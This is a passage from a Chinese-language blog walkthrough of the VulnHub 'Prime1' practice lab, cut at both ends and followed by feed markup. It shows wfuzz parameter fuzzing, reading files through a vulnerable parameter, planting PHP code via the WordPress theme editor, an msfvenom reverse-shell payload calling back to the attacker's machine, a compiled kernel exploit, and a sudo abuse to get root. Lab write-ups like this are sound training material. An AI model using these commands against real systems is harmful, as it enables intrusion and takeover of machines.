href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">我们网站</a>学习一下基本工具的使用</p></blockquote><p>我不管，我才不要等下再用这个提示，我就是要现在就访问<code>location.txt</code>，不然我不甘心</p><p><img src="/img/image-20221103162840784.png" alt="image-20221103162840784"></p><p>甘心了，，，对不起打扰了！</p><h2 id="Fuzz参数"><a href="#Fuzz参数" class="headerlink" title="Fuzz参数"></a>Fuzz参数</h2><p>既然上面提到php，那就先扫一下有哪些php，再针对每个php做Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .php</span><br></pre></td></tr></table></figure><p>就扫出来这俩</p><p><img src="/img/image-20221103163102067.png" alt="image-20221103163102067"></p><p><strong>激动人心的Fuzz</strong></p><p>问题来了，Fuzz是个啥？不懂的来看看<a href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962?fr=aladdin">度娘的解释</a></p><p>看懂了么？我唬你呢！看了比没看还模糊了是吧哈哈哈</p><p>我这里用我自己的浅显理解来解释一下Fuzz</p><blockquote><p>Fuzz即<strong>模糊测试</strong></p><p>就是瞎鸡儿乱猜的意思</p><p>用上面的例子来说，要你Fuzz参数，那参数是个啥样子？get请求下就是<a href="http://192.168.120.145/index.php?%E5%8F%82%E6%95%B0=xxx">http://192.168.120.145/index.php?参数=xxx</a></p><p>至于参数是啥，我不知道啊，那我就只能乱猜，万一瞎猫碰上死耗子，给我猜对了呢？</p><p>Fuzz就是这样，不看技术，全看运气，谁也不知道到底能不能猜对</p></blockquote><p>工具随便哈，很多工具都可以做Fuzz（BP就可以）</p><p>我这里选择直接用kali里面自带的工具<code>wfuzz</code>和自带的字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103170429320.png" alt="image-20221103170429320"></p><p>这里解释下这几列的含义</p><ul><li>ID：就id，没啥别的意思</li><li>Response：HTTP请求返回的状态码</li><li>Lines：返回包的行数</li><li>Word：单词个数</li><li>Chars：字符个数</li><li>Payload：Fuzz的参数</li></ul><p>上面字典返回了900多条数据，那怎么找那些可能是正确的参数呢？思路是与大部分不同的一般就有蹊跷，因为大部分参数是错的，那正确的势必返回的就不一样。</p><p>Burp爆破的话，直接点一下排序就看出来了，这个破工具还要用命令行重新执行命令来排序，我真的会谢！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看看参数，看有啥可以用的</span></span><br><span class="line">wfuzz -h</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用参数过滤</span></span><br><span class="line">--hc# 过滤掉某个响应状态</span><br><span class="line">--hl# 过滤掉响应为x行的</span><br><span class="line">--hw# 过滤掉响应为x个单词的</span><br><span class="line">--hh# 过滤掉响应为x个字符的</span><br></pre></td></tr></table></figure><p>我这里随便选个过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hl 7 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><p>结果是：糟糕！裤衩子都过滤没了</p><p><img src="/img/image-20221103172027133.png" alt="image-20221103172027133"></p><p>那就只能换个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hw 12 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure><h2 id="得到index-php的参数"><a href="#得到index-php的参数" class="headerlink" title="得到index.php的参数"></a>得到index.php的参数</h2><p>有东西啊！</p><p><img src="/img/image-20221103172145627.png" alt="image-20221103172145627"></p><p>还记得上面<code>secret.txt</code>里面的提示吗？记不记得有个<code>location.txt</code>？</p><p>还有扫出来的两个php文件：<code>image.php</code>和<code>index.php</code></p><p>现在用这个Fuzz出来的参数试试吧！</p><p><code>image.php</code>没变化</p><p><img src="/img/image-20221103183545155.png" alt="image-20221103183545155"></p><p><code>index.php</code>出现了点不一样的东西，多了些文字</p><p><img src="/img/image-20221103172359891.png" alt="image-20221103172359891"></p><p>翻译</p><blockquote><p>小伙子不错啊！</p><p>现在你知道正确的参数了</p><p><strong>用<code>secrettier360</code>参数去尝试其他的php页面吧！</strong></p></blockquote><h2 id="得到iamge-php的参数"><a href="#得到iamge-php的参数" class="headerlink" title="得到iamge.php的参数"></a>得到iamge.php的参数</h2><p>这时，把上面没变化的<code>image.php</code>按照提示的参数试一试</p><p><img src="/img/image-20221103184200350.png" alt="image-20221103184200350"></p><p>好的，你得到了正确的参数</p><h2 id="password-txt"><a href="#password-txt" class="headerlink" title="password.txt"></a>password.txt</h2><p>然后呢，就一句话就没了？？？思路好像又断了，继续往下想想，既然给了file让我们来读取文件，那我们可不可以去读取一些敏感文件呢？说干就干！</p><p>然而，emmmmmm…….又断了，系统提示挖错文件了</p><p><img src="/img/image-20221103184903209.png" alt="image-20221103184903209"></p><p>试试另外一个，居然成了，好吧我装的，因为我去看了视频。</p><p>我一直在试前面那个<code>index.php</code>的参数，反而忽视了靶场一步步把我们引到到<code>image.php</code>，还给了正确的参数。</p><p><img src="/img/image-20221103185510097.png" alt="image-20221103185510097"></p><p>接下来就顺着给出的提示，我尝试直接读取password.txt，没有结果</p><p>看了一眼上面的提示，Find <strong>password.txt</strong> in <strong>my directory</strong></p><p>分析主要的突破点是要知道提示所说的<strong>my directory</strong>是指的哪一个目录，想到Linux下，每一个用户都有一个home目录，用户名是victor，接下来我们就来验证这条猜想</p><p><img src="/img/image-20221103190414091.png" alt="image-20221103190414091"></p><p>还是那句话，空空如也，我C他NN的！！！</p><p>这时候，我又去看了一眼上面的截图，就在我画框的后面，就有路径啊！！！我顺着那个路径找过去，出来了！还是我太菜了，Linux基础学的不好，才去分析上面那一堆有的没的。</p><p><img src="/img/image-20221103190658299.png" alt="image-20221103190658299"></p><h2 id="登录WordPress"><a href="#登录WordPress" class="headerlink" title="登录WordPress"></a>登录WordPress</h2><p>当时看到这串字符的时候，我第一反应是有点懵，要我关注ippsec？？？这是啥意思，过了一会才反应过来，这有没有可能就是密码啊？而且这是password.txt欸？</p><p>拿着这串字符去试着登录了一下victor用户，喜提”密码错误“💔💔💔</p><p><img src="/img/image-20221103190941126.png" alt="image-20221103190941126"></p><p>到这，我又不知道怎么办了。</p><p>去看了下视频的提示：<strong>这到底是什么的密码？</strong></p><p>于是我想起，之前端口扫描的时候，有个22端口，猜测有可能是<strong>SSH</strong>的密码，我马上打开我的XShell。</p><p>哈哈，没连上mad❗</p><p>然后我又想，还有啥密码？前面好像还有个WordPress博客，去试试看，也许就是这个呢？然后我往上翻了下之前目录扫描的截图，进到了<a href="http://192.168.120.145/wordpress/wp-admin%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%88%B0wordpress%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2">http://192.168.120.145/wordpress/wp-admin，然后跳转到wordpress的登陆界面</a></p><p><img src="/img/image-20221103225332819.png" alt="image-20221103225332819"></p><p>用户名当然是猜的victor，因为之前看过这个博客首页，加上靶机上的登录用户名也是victor，密码输入follow_the_ippsec，点登录</p><blockquote><p>后面了解到，WordPress在搭建成功后会自动生成一篇博客，用户名就是管理员的用户名</p><p>还有Kali自带的工具<code>cmseek</code>和<code>wpscan</code>可以去扫描WordPress站点的用户名和漏洞，以及其他信息</p></blockquote><p>在几秒的转圈圈之后，进去了！！！</p><p><img src="/img/image-20221103225535739.png" alt="image-20221103225535739"></p><p>找了一圈，没发现什么信息。唯一发现了一个邮箱，我还用这个邮箱去试了一下密码，不对，作罢！</p><p>又开始偷思路😂😂😂</p><h2 id="WordPress主题编辑"><a href="#WordPress主题编辑" class="headerlink" title="WordPress主题编辑"></a>WordPress主题编辑</h2><p>了解到【Appearance】的【Theme Editer】可以编辑主题，里面存在部分php可以被编辑，php哦！！！还是可以编辑的，那不直接一句话木马开搞？？？</p><p><img src="/img/image-20221103231333565.png" alt="image-20221103231333565"></p><p>接下来就是去找可以编辑的，连着点了好多个，都是这种不能修改的</p><p><img src="/img/image-20221103231930552.png" alt="image-20221103231930552"></p><p>皇天不负有心人！终于找到一个能改的</p><p><img src="/img/image-20221103232115455.png" alt="image-20221103232115455"></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>直接开整！！！等啥呀？</p><p><img src="/img/image-20221103232359755.png" alt="image-20221103232359755"></p><p>上传成功！nice！好了，就等着我拿下你吧小卡拉米！</p><p>高高兴兴掏出我的蚁剑</p><p><img src="/img/image-20221104100447856.png" alt="image-20221104100447856"></p><p>好了，问题来了，我这个URL要怎么填？WordPress的后台编辑那里的url是<a href="http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen%EF%BC%8C%E8%BF%99%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%B8%8D%E8%A1%8C%E5%95%8A%EF%BC%8C%E6%88%91%E8%A6%81%E6%89%BE%E5%88%B0secret.php%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84%E6%89%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%AF%B9WordPress%E4%B8%8D%E7%86%9F%E6%82%89%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%8C%9C%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84%E3%80%82">http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen，这一看就不行啊，我要找到secret.php的真实路径才行，但是我对WordPress不熟悉，不知道怎么猜这个路径。</a></p><h2 id="确定路径"><a href="#确定路径" class="headerlink" title="确定路径"></a>确定路径</h2><p>我知道WordPress是开源的，于是我上<a href="https://core.trac.wordpress.org/browser/#branches/5.2/src/wp-admin/includes">WordPress官网</a>下了一份5.2版本的源码（<strong>Dashboard</strong>往下划，<strong>At a Glance</strong>板块可以看到WordPress的版本和使用的主题）</p><p><img src="/img/image-20221104110916788.png" alt="image-20221104110916788"></p><p>然后就顺着这个线索，结合上面修改页面右侧的文件结构，在源码里找到了这个路径</p><p><img src="/img/image-20221104111036384.png" alt="image-20221104111036384"></p><p><img src="/img/image-20221104111310256.png" alt="image-20221104111310256"></p><p>接下来我就按照这个路径，用蚁剑去连了。</p><p>直接红一片我也是没想到</p><p><img src="/img/image-20221104111549931.png" alt="image-20221104111549931"></p><p>然后我又去浏览器访问这个网址</p><p><img src="/img/image-20221104111657882.png" alt="image-20221104111657882"></p><p>返回404，意思就是secret.php不在这个路径</p><p>到这里，思路又断了（真的太菜了）</p><p>继续偷思路（emm这叫借鉴！！）</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>了解到可以<strong>反弹shell</strong>，其实之前一直知道这个概念，但是没有实战过，所以也不知道什么时候该用，怎么用。这次真的是学到了！</p><p>继续用我浅显的理解来解释一下<strong>反弹shell</strong></p><blockquote><p>首先要明确：<strong>反弹shell</strong>和<strong>一句话木马</strong>的目的都是一样的，就是<strong>为了拿shell</strong></p><p>区别在于</p><ul><li>一句话木马：上传之后，你得主动用WebShell管理工具之类的东西去连他，连上了才可以</li><li>反弹shell：让<strong>它主动来连你</strong></li></ul><p>这有啥不一样呢？为啥一定要它来连你呢？你连他为啥又不行呢？</p><p>想象一下，你去别的学校找朋友玩泥巴，但是他们学校只允许本校师生进出，不允许外面的人进出。这时候，你们想见面一起玩泥巴，那就只能让他出来找你，因为门卫不让你进去找他啊！！（说翻墙钻狗洞进去的小伙子，你真是个大聪明🤡）</p><p>一样的意思，当一台机子处于<strong>内网、动态IP</strong>，或者<strong>配置了防火墙、杀毒软件</strong>，那很可能，你是没有办法去连接它的，只能让它出来连你，这就是<strong>反弹shell</strong></p></blockquote><h3 id="生成php反弹shell代码"><a href="#生成php反弹shell代码" class="headerlink" title="生成php反弹shell代码"></a>生成php反弹shell代码</h3><p>现在，用我们的<em><strong>美少妇（MSF）</strong></em>来生成php反弹shell的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.120.128 lport=6666 -o shell.php</span><br></pre></td></tr></table></figure><blockquote><p>这句话的意思是让msfvenom的php&#x2F;meterpreter&#x2F;reverse_tcp模块来生成反弹shell的脚本，设置让靶机来连Kali（IP:192.168.120.128）的6666端口，保存为<code>shell.php</code></p></blockquote><p><img src="/img/image-20221104133526200.png" alt="image-20221104133526200"></p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>把生成的代码粘贴到<code>secret.php</code>里面（粘贴我上面黑色的那一坨，前面俩不要粘上去了），保存</p><p><img src="/img/image-20221104134106090.png" alt="image-20221104134106090"></p><h3 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h3><p>接下来，就是监听了</p><blockquote><p>为啥要监听？</p><p>接着上面的例子说哈，你朋友都出校门来找你玩泥巴来了，你不得蹲在门口等他吗？不然你怎么知道他出来了呢？只能蹲在门口守着呗。</p><p>这也是一样的，你让靶机来连你，你不监听那个端口，你咋知道它来连你那个端口了？</p></blockquote><p>那我们用啥来监听呢？<del>当然是亲自蹲在电脑显示器上呗</del>（bushi）</p><p>当然是用工具来监听啦~可用的工具有很多，这里推荐<code>nc</code>和<code>msfconsole</code></p><p>这里用msfconsole（因为它给我比心❤）</p><ol><li>命令行输入<code>msfconsole</code>，启动美少妇</li></ol><p><img src="/img/image-20221104134918991.png" alt="image-20221104134918991"></p><ol start="2"><li>使用监听模块</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104135312786.png" alt="image-20221104135312786"></p><ol start="3"><li>告诉它，你在等待一个php的反弹来连你</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里的模块和上面使用msfvenom生成反弹shell的模块是一样的</span></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="4"><li>指定监听的IP和端口</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.120.128</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><ol start="5"><li>启动监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">任选一个执行，效果是一样的</span></span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h3><p>监听就准备好啦~接下来的问题是</p><p><strong>靶机什么时候来连我们呢？</strong></p><p>这就得你去提醒一下它，让他来连你，这时候我突然发现，我上面费大劲找的<code>secret.php</code>路径，这时候用得到了！！！</p><p>访问<a href="http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.120.145/wordpress/wp-content/themes/twentynineteen/secret.php</a></p><p><img src="/img/image-20221104140546616.png" alt="image-20221104140546616"></p><p>页面虽然一直在加载，这时候打开我们的Kali看看，已经进入到meterpreter了！！！就是已经反弹连接上了，我们已经拿到靶机的shell了。</p><p>执行命令看看，没问题！</p><p><img src="/img/image-20221104155213895.png" alt="image-20221104155213895"></p><blockquote><p>注意：</p><p>我们此时拿到的shell环境，并不是root用户，meterpreter并不能执行所有的命令</p></blockquote><h1 id="内核提权【适用于Ubuntu-4-10】"><a href="#内核提权【适用于Ubuntu-4-10】" class="headerlink" title="内核提权【适用于Ubuntu 4.10】"></a>内核提权【适用于Ubuntu 4.10】</h1><p>上面我们拿到了靶机的Linux版本，用msfconsole看看有没有能提权的模块</p><blockquote><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<em>不要在meterpreter下直接执行，新开一个Terminal，进入msfconsole里面执行</em></p><p>或者使用<code>background</code>回退到msf的界面，记住返回的<code>session</code>为1，到时候直接通过<code>sessions 1</code>回到meterpreter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 16.04 Ubuntu</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221104171340983.png" alt="image-20221104171340983"></p><p>使用其中符合条件的<em><strong>linux&#x2F;local&#x2F;45010.c</strong></em></p><blockquote><p>用来提权到root，用C语言编写其路径为&#x2F;usr&#x2F;share&#x2F;exploits&#x2F;local&#x2F;45010.c</p></blockquote><ol><li>将该文件拷贝到当前目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span><br></pre></td></tr></table></figure><ol start="2"><li>用<code>gcc</code>编译该文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>用meterpreter</strong>把上面生成的<code>45010</code>移动到靶机里面（<strong>此步骤在meterpreter里面执行！！！</strong>）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/slipper/45010 /tmp</span><br></pre></td></tr></table></figure><blockquote><p>本句的意思是：把本机<code>home/slipper/45010</code>上传到靶机的<code>/tmp</code>目录</p></blockquote><ol start="4"><li>进入shell，给<code>45010</code>添加可执行的权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3108 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时已经进入到靶机的shell环境</span></span><br><span class="line">pwd# 查看当前目录</span><br><span class="line">/tmp</span><br><span class="line">chmod +x 45010# 添加执行权限</span><br><span class="line">./45010# 执行该提权程序</span><br></pre></td></tr></table></figure><p>这时候已经提权成功了</p><h1 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h1><p>&#x3D;&#x3D;实际上，我的提权失败了&#x3D;&#x3D;</p><p>按理来说，是可以成功的，但是我当时没弄完就去做其他的事情，第二天再来弄的时候，我的靶机IP变了，从145变成147了。我当时觉得奇怪，因为我虚拟机Kali的IP一直就没变过，为什么这个突然变了。当时没有在意，直到我使用上述方法，屡次提权失败</p><p>于是，我几乎翻遍了网上关于Prime1这个靶机的记录，终于看到一句话：</p><p>&#x3D;&#x3D;有些情况我们下载的靶机的版本并不是Ubuntu4.10而是Ubuntu 4.15，就不能通过45010这个复现成功&#x3D;&#x3D;</p><p>但是我明明记得我是4.10。然后，我就又去看了一下我Ubuntu靶机的版本信息</p><p><img src="/img/image-20221105150754154.png" alt="image-20221105150754154"></p><p>&#x3D;&#x3D;我的Ubuntu居然自动升级了！&#x3D;&#x3D;</p><p>可以往上看我当时的截图，当时的版本是4.10的，一觉起来，Ubuntu靶机给我自动升级成4.15了，估计也是这个原因，导致靶机的IP发生了变化。</p><p>而此时，4.15版本的已经不能使用上述方法提权了。我用msf搜索了升级之后的版本还有没有可以用的提权代码，已经🈚了，所以靠nday提权已经行不通了，靶机的设计者的目的并不是想让我们靠提权来拿到Flag，而是像上面一样，一层层的剥开，找到密码。</p><blockquote><p>这个问题真的折磨了我很久，第一次遇到这种骚操作</p></blockquote><h1 id="提权【适用于Ubuntu-4-15】"><a href="#提权【适用于Ubuntu-4-15】" class="headerlink" title="提权【适用于Ubuntu 4.15】"></a><strong>提权【适用于Ubuntu 4.15】</strong></h1><ol><li>进入shell环境</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">将shell升级到完全交互式的TTY</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看当前用户可以用 sudo 执行哪些命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105153916471.png" alt="image-20221105153916471"></p><p>这里的<code>/home/saket/enc</code>引起了注意，它是一个可执行文件，执行需要输入密码，使用<code>follow_the_ippsec</code>发现不对</p><h2 id="backup文件"><a href="#backup文件" class="headerlink" title="backup文件"></a>backup文件</h2><p>在<code>/opt</code>目录下发现<code>backup</code>文件夹，最终发现了<code>可执行文件enc</code>的密码为<code>backup_password</code></p><p><img src="/img/image-20221105154613484.png" alt="image-20221105154613484"></p><ol start="4"><li>执行<code>enc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">./enc</span><br></pre></td></tr></table></figure><ol start="5"><li>此时发现<code>/home/saket</code>目录下多了两个文件：<code>enc.txt</code>和<code>key.txt</code></li></ol><p><img src="/img/image-20221105155104206.png" alt="image-20221105155104206"></p><p>得到了一串字符和一条提示，看样子应该是base64编码的</p><ol start="6"><li>使用<a href="https://www.cmd5.com/">cmd5</a>加密<code>ippsec</code></li></ol><p><img src="/img/image-20221105155927773.png" alt="image-20221105155927773"></p><p>得到</p><p>md5(ippsec,32) &#x3D; 366a74cb3c959de17d61db30591c39d1<br>md5(ippsec,16) &#x3D; 3c959de17d61db30</p><ol start="7"><li>使用<a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES Encryption and Decryption Online Tool</a>解密<code>enc.txt</code></li></ol><p><img src="/img/image-20221105161448956.png" alt="image-20221105161448956"></p><p>解密结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RG9udCB3b3JyeSBzYWtldCBvbmUgZGF5IHdlIHdpbGwgcmVhY2ggdG8Kb3VyIGRlc3RpbmF0aW9uIHZlcnkgc29vbi4gQW5kIGlmIHlvdSBmb3JnZXQgCnlvdXIgdXNlcm5hbWUgdGhlbiB1c2UgeW91ciBvbGQgcGFzc3dvcmQKPT0+ICJ0cmlidXRlX3RvX2lwcHNlYyIKClZpY3Rvciw=</span><br></pre></td></tr></table></figure><ol start="8"><li>对上面的字符串进行<a href="https://tool.chinaz.com/tools/base64.aspx">Base64解码</a></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,</span><br></pre></td></tr></table></figure><p>得到了密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tribute_to_ippsec</span><br></pre></td></tr></table></figure><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su saket</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105162115763.png" alt="image-20221105162115763"></p><ul><li>查看saket用户可用sudo执行的命令</li></ul><p><img src="/img/image-20221105165526516.png" alt="image-20221105165526516"></p><ul><li>跟进到&#x2F;home&#x2F;victor&#x2F;undefeated_victor</li></ul><p><img src="/img/image-20221105165644625.png" alt="image-20221105165644625"></p><p>提示<code>/tmp/challenge</code> not found</p><h2 id="x2F-bin-x2F-bash提权"><a href="#x2F-bin-x2F-bash提权" class="headerlink" title="&#x2F;bin&#x2F;bash提权"></a>&#x2F;bin&#x2F;bash提权</h2><ul><li>接下来的思路就是创建<code>challenge</code>文件，将<code>/bin/bash</code>写入文件中，然后重新执行<code>sudo /home/victor/undefeated_victor</code>命令以<strong>获取root权限的shell</strong>.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105170834360.png" alt="image-20221105170834360"></p><p>可以看到，此时已经&#x3D;&#x3D;成功拿到root权限&#x3D;&#x3D;</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><ul><li>切换到&#x2F;root,查看</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171431456.png" alt="image-20221105171431456"></p><ul><li>查看<code>root.txt</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171456711.png" alt="image-20221105171456711"></p><p>完结撒花~~~终于拿到了flag</p><h1 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h1><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><ul><li><p>使用nmap扫描的时候，用的是最简单的命令，扫描显示出来的信息比较单一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC ... &gt; xxx.txt</span><br></pre></td></tr></table></figure><p>导出到文件里，到时候找起来更方便，不要每次都在终端翻来翻去</p></li><li><p>对Kali内的工具不熟悉，到某个特定的步骤之后，知道要干啥，但不知道具体要怎么做，有什么工具可以使用。如果只下载了，又不去用它，那为什么要下载呢？单纯为了好看吗？</p><blockquote><p>后续花时间专门整理一下Kali的工具，输出一个文档</p></blockquote></li></ul><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>初次解除了完整的一套渗透测试流程，从查找IP到拿到Root权限，从Web打到shell再到提权</li><li>wordpress的主题模块可以执行命令</li><li>反弹shell初体验</li><li>更加熟悉linux的一些命令，比如<code>sudo -l</code>等</li><li>msf可用用background命令把meterpreter退到后台</li></ul><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><ul><li>最后AES解密：为什么是AES？那些参数是这么选的，问了大佬，说是密码学的知识！补！！！</li><li>写入<code>/bin/bash</code>提权，不懂！看！！！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp验证码爆破captcha-killer+ddddocr</title>
      <link href="/burpsuite-captcha-killer-ddddocr/"/>
      <url>/burpsuite-captcha-killer-ddddocr/</url>
      
